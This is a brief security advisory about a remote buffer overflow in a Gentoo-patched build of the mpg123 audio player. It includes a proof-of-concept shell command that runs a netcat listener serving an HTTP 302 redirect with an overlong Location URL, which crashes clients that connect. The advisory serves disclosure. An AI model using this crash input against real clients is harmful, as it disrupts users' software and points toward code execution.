The mpg123 application is prone to a remote buffer-overflow vulnerability because it fails to properly bounds-check user-supplied input before copying it to an insufficiently sized memory buffer.

This issue may allow remote attackers to execute arbitrary machine code in the context of the affected application.

This issue is specific to a patch applied to the Gentoo Linux version of mpg123.

The following commands are sufficient to demonstrate this issue by crashing affected applications:

( echo -ne "HTTP/1.1 302 Found\r\nLocation: "
echo -ne "http://fooooooooooooooooooooooooooooooooooooooooooooooooo/\r\n\r\n"
)| nc -lp 8080 &
